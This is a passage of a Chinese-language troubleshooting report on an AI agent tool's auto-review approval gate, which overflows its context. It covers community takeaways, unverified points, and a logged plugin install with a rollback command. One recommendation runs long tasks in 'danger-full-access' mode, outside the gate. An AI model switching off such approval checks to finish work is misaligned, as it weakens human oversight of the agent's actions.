| opencode-go 路由 | `dsh-opencode-go-x-session` | ✅ 有（插件补头），但与超窗无关 |

### 7.5 对"我们该怎么办"的社区启示

1. **别等官方**：官方文档已把行为写死（不缓存、不截断、不设预算、超窗即失败），社区最热的两条路都是"绕开"而不是"等修"。
2. **先修上游**：我们那次会话 0 次压缩，说明门的输入是"从来没被管理过"。先把压缩阈值/输出预留调到能真正触发（`modelLimits` 8192 + 必要时 `dsh-session-manager` 的百分比阈值），门的输入才有上限。
3. **要保留自动审批，就用有界替代门**：`dsh-auto-review`（有界 4K chars）+ `dsh-permission-rules`（零模型调用）是社区现成的组合，比自研少维护；自研的价值只剩"完全本地、无外网、规则可审计"。
4. **不要在生产会话里开 Auto 做长任务**：它是"逐调用一次模型请求"的实现，任何长会话都会线性累积；社区实际做法是**长任务用 danger-full-access / 手动审批，Auto 只用于无人值守的短任务**。

### 7.6 本节未验证项

1. GitHub Discussions 正文为 JS 渲染，`#10153`/`#10751` 只取到标题与 dsh-ai.com 的 AI 摘要，**未逐字读到正文**（`r.jina.ai` 本机 DNS 被污染、`api.github.com` 无 Discussions REST 端点）——影响：CJK 低估的 2.3x 具体测量方法只信到"摘要级"。
2. 各替代门插件的 star/下载/README 来自 2026-10-29 抓取，之后可能变化。
3. `dsh-session-manager` 的"17%–90% 阈值、对所有 preset 生效"来自其 README 描述，**未在本机实装验证**。
4. 未验证官方 0.2.2/后续 nightly 是否改变了 auto-review 的输入预算策略（当前 nightly feed 可查，但未拉取对照）。

## ⑧ 已落地动作（2026-10-29 16:21）

- 装的是 **dream12347/tasselx/dsh-session-manager v0.2.2**（带「上下文压缩阈值 17%–90%」的那个），不是 npm 上同名包 `dsh-session-manager@0.7.5`（作者 hkkz9522，无阈值功能，已移除）。
- 来源：GitHub Release 直连在本机 ECONNRESET，改用 cdn.jsdelivr.net 取 v0.2.2 发布文件 → 本地 `npm pack` 成 tgz → 存 `C:\Users\kf-41\.dsh\packages\dsh-session-manager-0.2.2.tgz` → `pnpm add` 进 desktop profile。
- 接线：profile package.json dependencies + `dsh.profile.bundles` 末尾 `dsh-session-manager`（bundle patch 行 id=dsh-session-manager 一致）；`.dsh-market/state.json` 的 disabled 为空。
- 生效机制（README 原文）：阈值存存储域 `dsh_delete_session.thresholdRatio`；host 在每个 `agent/pre-step` 把阈值写进所有 Agent preset 的压缩引擎配置 → 对所有会话生效、重启保持。
- 调参建议：本机 tokenMeter 用 chars/4（CJK 低估 ~2.3×），80% 阈值在中文长会话里**永远不触发**（能撞到门的 983K 真实 token ≈ 计量 505K，远低于 800K）。建议先设 **35%**（≈真实 790K 触发），再按压缩频率微调。
- 回滚：`cd C:\Users\kf-41\.dsh\profiles\desktop && cp package.json.bak-before-swap package.json && cp pnpm-lock.yaml.bak-before-swap pnpm-lock.yaml && pnpm install`。
